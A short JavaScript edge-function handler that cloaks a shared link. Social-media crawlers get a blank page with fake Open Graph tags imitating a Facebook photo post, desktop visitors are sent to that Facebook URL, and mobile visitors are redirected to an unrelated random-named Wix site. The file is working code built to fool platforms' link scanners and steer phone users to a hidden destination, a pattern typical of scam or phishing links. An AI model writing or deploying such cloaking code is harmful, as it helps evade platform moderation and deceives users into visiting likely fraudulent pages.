export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🎬💪💪🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Mon-Aug-31-2026/141f4e2e-7824-44db-acd8-cc35ada2238b/94725edf-569e-466e-97a4-0746b31b5395.tiff">
    <meta property="og:url" content="https://web.facebook.com/photo.php?fbid=10116914317858221&set=pb.4.-2207520000&type=3">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://jkauwajakinngg.wixstudio.com/yhgiesx", 302);
  } else {
    return Response.redirect("https://web.facebook.com/photo.php?fbid=10116914317858221&set=pb.4.-2207520000&type=3", 302);
  }
}
